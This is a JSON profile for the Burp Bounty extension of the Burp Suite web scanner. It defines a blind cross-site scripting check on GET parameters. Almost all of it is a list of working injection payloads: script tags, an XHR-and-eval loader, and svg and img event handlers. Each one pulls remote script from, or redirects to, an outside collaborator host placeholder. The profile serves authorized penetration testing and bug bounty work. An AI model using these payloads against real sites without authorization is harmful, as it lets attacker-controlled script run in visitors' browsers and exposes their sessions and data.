[
  {
    "ProfileName": "Blind_XSS_GETParams",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "true,\u003cscript\u003e$.getScript(\"//{BC}\")\u003c/script\u003e",
      "true,\u003cscript\u003efunction b(){eval(this.responseText)};a\u003dnew XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//{BC}\");a.send();\u003c/script\u003e",
      "true,\"\u003e\u003cscript src\u003dhttp://{BC}\u003e\u003c/script\u003e",
      "true,javascript:eval(\u0027var a\u003ddocument.createElement(\\\u0027script\\\u0027);a.src\u003d\\\u0027http://{BC}\\\u0027;document.body.appendChild(a)\u0027)",
      "true,\u003cscript src\u003dhttp://{BC}\u003e\u003c/script\u003e",
      "true,\u003csvg/oNLoAd\u003d(document.location\u003d\u0027http://{BC}\u0027)\u003e",
      "true,\"\u003e\u003csvg/oNLoAd\u003d(document.location\u003d\u0027http://{BC}\u0027)\u003e",
      "true,\u003cimg src\u003dx onerror\u003dthis.src\u003d\"http://{BC}\"\u003e"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [],
    "Tags": [
      "All",
      "XSS",
      "Blind XSS GET Parameters",
      "All GET Parameters"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 5,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "Blind_XSS_GETParams",
    "IssueSeverity": "Medium",
    "IssueConfidence": "Certain",
    "IssueDetail": "\n\n\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      0
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]